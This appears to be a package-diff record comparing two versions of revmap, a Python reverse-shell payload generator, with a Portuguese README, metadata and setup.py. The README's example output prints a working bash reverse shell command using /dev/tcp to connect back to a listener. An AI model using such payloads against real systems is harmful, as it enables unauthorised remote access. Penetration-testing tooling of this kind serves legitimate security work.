+O revmap é uma ferramenta que gera payloads de reverse shell de várias linguagens como python, bash, perl, powershell e muit outros. Possui uma funcionalidade que faz encode das payloads desejadas e dessa forma sendo simples e otimizada para velocidade. Revmap é construído para fazer apenas uma coisa: gera payloads reverse shell + encodes e faz isso muito bem.
+
+Projetei o `revmap` para cumprir todas as responsabilidades para gera payloads e encodes, mantive um modelo consistentemente passivo para torná-lo útil para testadores de penetração.
+
+# Características
+
+ - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
+ - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
+
+# Forma de utilização
+
+```sh
+revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
+revmap --ip 192.168.4.80 --port 4444 --payload bash 
+revmap --ip 192.168.4.80 --port 4444 --payload python
+revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
+```
+Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
+```yaml
+ ___ ___ _ _ _____ ___ ___ 
+|  _| -_| | |     | .'| . |
+|_| |___|\_/|_|_|_|__,|  _|
+                      |_|  
+        v0.0.1 - @joaoviictorti 
+
+options:
+  --h, --help            show this help message and exit
+  --version             show program's version number and exit
+  --ip IP                Insert ip
+  --port PORTA           Insert port
+  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
+  --encode {base64,hex,urlencode} Insert encode
+```
+
+# Instalação
+
+revmap requer **python3** e para baixá-lo só usar:
+
+```sh
+pip3 install revmap
+```
+
+# Executando revmap
+
+```console
+revmap --ip 192.168.4.160 --port 8080 --payload bash
+
+ ___ ___ _ _ _____ ___ ___ 
+|  _| -_| | |     | .'| . |
+|_| |___|\_/|_|_|_|__,|  _|
+                      |_|  
+        v0.0.1 - @joaoviictorti 
+                                               
+
+bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
+```
+
+
+<img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: revmap Version: 0.0.2 Summary: Tool that generates
+Metadata-Version: 2.1 Name: revmap Version: 0.0.3 Summary: Tool that generates
 reverse shell in multiple languages and encodes Home-page: https://github.com/
 joaoviictorti/revmap Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: revshell shell python
 security Classifier: Development Status :: 5 - Production/Stable Classifier:
 Environment :: Console Classifier: Intended Audience :: System Administrators
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Natural Language :: English Classifier: Operating System :: OS
```

### Comparing `revmap-0.0.2/setup.py` & `revmap-0.0.3/setup.py`

 * *Ordering differences only*

 * *Files 19% similar despite different names*

```diff
@@ -1,55 +1,55 @@
-#!/usr/bin/python3
-# -*- coding: UTF-8 -*-
-from setuptools import setup, find_packages
-import os
-
-meta = {}
-here = os.path.abspath(os.path.dirname(__file__))
-
-with open(f'{here}/revmap/__meta__.py', encoding='utf-8') as arquivo:
-    exec(arquivo.read(), meta)
-
-with open('README.md', 'r', encoding='utf-8') as arq:
-    readme = arq.read()
-
-setup(
-    name=meta['__title__'],
-    version=meta['__version__'],
-    license='MIT License',
-    author=meta['__author__'],
-    url=meta['__url__'],
-    long_description=readme,
-    long_description_content_type='text/markdown',
-    author_email=meta['__author_email__'],
-    keywords='revshell shell python security',
-    description=meta['__description__'],
-    packages=find_packages(),
-    zip_safe=False,
-    python_requires='>=3.6, <4',
-    classifiers=[
-        'Development Status :: 5 - Production/Stable',
-        'Environment :: Console',
-        'Intended Audience :: System Administrators',
-        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
-        'Natural Language :: English',
-        'Operating System :: OS Independent',
-        'Programming Language :: Python',
-        'Programming Language :: Python :: 3',
-        'Programming Language :: Python :: 3.8',
-        'Programming Language :: Python :: 3.9',
-        'Programming Language :: Python :: 3.10',
-        'Programming Language :: Python :: 3.11',
-        'Programming Language :: Python :: 3 :: Only',
-        'Programming Language :: Python :: Implementation :: PyPy',
-        'Topic :: Security',
-        'Topic :: System :: Networking',
-        'Topic :: System :: Operating System',
-        'Topic :: System :: Systems Administration',
-        'Topic :: Utilities',
-    ],
-    entry_points={
-        'console_scripts': [
-            'revmap=revmap.revmap:argumentos',
-        ]
-    },
-)
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
+from setuptools import setup, find_packages
+import os
+
+meta = {}
+here = os.path.abspath(os.path.dirname(__file__))
+
+with open(f'{here}/revmap/__meta__.py', encoding='utf-8') as arquivo:
+    exec(arquivo.read(), meta)
+
+with open('README.md', 'r', encoding='utf-8') as arq:
+    readme = arq.read()
+
+setup(
+    name=meta['__title__'],
+    version=meta['__version__'],
+    license='MIT License',
+    author=meta['__author__'],
+    url=meta['__url__'],
+    long_description=readme,
+    long_description_content_type='text/markdown',
+    author_email=meta['__author_email__'],
+    keywords='revshell shell python security',
+    description=meta['__description__'],
+    packages=find_packages(),
+    zip_safe=False,
+    python_requires='>=3.6, <4',
+    classifiers=[
+        'Development Status :: 5 - Production/Stable',
+        'Environment :: Console',
+        'Intended Audience :: System Administrators',
+        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',
+        'Natural Language :: English',
+        'Operating System :: OS Independent',
+        'Programming Language :: Python',
+        'Programming Language :: Python :: 3',
+        'Programming Language :: Python :: 3.8',
+        'Programming Language :: Python :: 3.9',
+        'Programming Language :: Python :: 3.10',
+        'Programming Language :: Python :: 3.11',
+        'Programming Language :: Python :: 3 :: Only',
+        'Programming Language :: Python :: Implementation :: PyPy',
+        'Topic :: Security',
+        'Topic :: System :: Networking',
+        'Topic :: System :: Operating System',
+        'Topic :: System :: Systems Administration',
+        'Topic :: Utilities',
+    ],
+    entry_points={
+        'console_scripts': [
+            'revmap=revmap.revmap:argumentos',
+        ]
+    },
+)
```

